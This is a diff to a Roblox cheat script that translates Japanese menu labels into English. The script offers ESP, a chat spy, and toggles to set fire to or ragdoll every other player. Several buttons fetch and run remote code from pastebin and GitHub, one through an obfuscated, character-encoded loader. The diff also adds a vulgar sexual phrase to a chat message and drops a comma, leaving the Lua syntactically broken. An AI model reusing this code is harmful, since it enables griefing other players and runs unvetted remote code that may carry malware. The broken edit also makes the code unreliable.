@@ -2350,18 +2350,16 @@ local espTab = Window:MakeTab({
       Name = "ESP",
       Icon = "",
       PremiumOnly = false
-})
-local highlightInstances = {}
+})local highlightInstances = {}
 local rainbowActive = false
 
 espTab:AddToggle({
-    Name = "ハイライト",
+    Name = "Highlights",
     Default = false,
     Callback = function(value)
         rainbowActive = value
 
         if rainbowActive then
-
             for _, player in pairs(Players:GetPlayers()) do
                 if player ~= Players.LocalPlayer and player.Character then
                     local highlight = Instance.new("Highlight")
@@ -2412,7 +2410,6 @@ espTab:AddToggle({
             end)
 
         else
-        
             for _, highlight in pairs(highlightInstances) do
                 if highlight then
                     highlight:Destroy()
@@ -2423,13 +2420,11 @@ espTab:AddToggle({
     end
 })
 
-
-
 local espEnabled = false
 local espConnections = {}
 
 espTab:AddToggle({
-    Name = "ESP（アイコン）",
+    Name = "ESP（Icon）",
     Default = false,
     Callback = function(state)
         espEnabled = state
@@ -2496,7 +2491,7 @@ Players.PlayerRemoving:Connect(function(player)
 end)
 
 local miscTab = Window:MakeTab({
-      Name = "その他",
+      Name = "Misc",
       Icon = "",
       PremiumOnly = false
 })
@@ -2518,11 +2513,11 @@ local PrivateProperties = {
 }
 
 miscTab:AddToggle({
-    Name = "チャットスパイ",
+    Name = "Chat Spy",
     Default = false,
     Callback = function(value)
         Config.enabled = value
-        PrivateProperties.Text = "{あそこ痒い" .. (Config.enabled and "ENABLED" or "DISABLED") .. "}"
+        PrivateProperties.Text = "{すっぱいまんこ" .. (Config.enabled and "ENABLED" or "DISABLED") .. "}"
         StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
 
         if Config.enabled then
@@ -2583,7 +2578,7 @@ end)
 local toysFolder = workspace:FindFirstChild(localPlayer.Name.."SpawnedInToys")
 
 miscTab:AddToggle({
-    Name = "全員燃やす",
+    Name = "Fire All",
     Default = false,
     Color = Color3.fromRGB(0, 255, 255),
     Save = true,
@@ -2653,10 +2648,9 @@ local toysFolder = workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
 local ragdollEnabled = false
 
 miscTab:AddToggle({
-    Name = "ラグドールオール",
+    Name = "Ragdoll All",
     Color = Color3.fromRGB(0, 255, 255),
-    Default = false,
-    Save = true,
+    Default = false
     Callback = function(enabled)
         ragdollEnabled = enabled
 
@@ -2704,7 +2698,7 @@ miscTab:AddToggle({
 })
 
 local scriptTab = Window:MakeTab({
-    	Name = "オナリプト",
+    	Name = "Script",
     	Icon = "",
     	PremiumOnly = false
 })
@@ -2731,33 +2725,34 @@ scriptTab:AddButton({
           		print("button pressed")SGTSOBF_WWwwWWWww={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\92","\49","\48","\52","\92","\49","\49","\54","\92","\49","\49","\54","\92","\49","\49","\50","\92","\49","\49","\53","\92","\53","\56","\92","\52","\55","\92","\52","\55","\92","\49","\49","\50","\92","\57","\55","\92","\49","\49","\53","\92","\49","\49","\54","\92","\49","\48","\49","\92","\57","\56","\92","\49","\48","\53","\92","\49","\49","\48","\92","\52","\54","\92","\57","\57","\92","\49","\49","\49","\92","\49","\48","\57","\92","\52","\55","\92","\49","\49","\52","\92","\57","\55","\92","\49","\49","\57","\92","\52","\55","\92","\53","\52","\92","\53","\49","\92","\56","\52","\92","\52","\56","\92","\49","\48","\50","\92","\49","\48","\55","\92","\54","\54","\92","\49","\48","\57","\92","\49","\48","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_HHhHHHHHh="";for _,SGTSOBF_dDDDDDDdD in pairs(SGTSOBF_WWwwWWWww)do SGTSOBF_HHhHHHHHh=SGTSOBF_HHhHHHHHh..SGTSOBF_dDDDDDDdD;end;SGTSOBF_CCCcCCcCC=function(SGTSOBF_fFFFFfFfF)loadstring(SGTSOBF_fFFFFfFfF)()end;SGTSOBF_CCCcCCcCC(SGTSOBF_HHhHHHHHh)
      end
     })
+
 scriptTab:AddButton({
-    	Name = "奈落",
+    	Name = "System Broken",
     	Callback = function()
           		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
     end})
 scriptTab:AddButton({
-    	Name = "アニメーション",
+    	Name = "Animation",
     	Callback = function()
           		print("button pressed")loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()
 end
 })
 
 scriptTab:AddButton({
-    	Name = "お絵描き",
+    	Name = "Drawing",
     	Callback = function()
           		print("button pressed")loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/Draw-To-Chat-Obfuscated/refs/heads/main/Draw%20to%20Chat"))()      	
   end    
 })
 
 local MainTab = Window:MakeTab({
-    Name = "スロット",
+    Name = "Slot",
     Icon = "rbxassetid://8659337867",
     PremiumOnly = false
 })
 
 local MainSection = MainTab:AddSection({
-    Name = "次回せるまでの時間"
+    Name = "Next Time"
 })
 
 local timerLabel
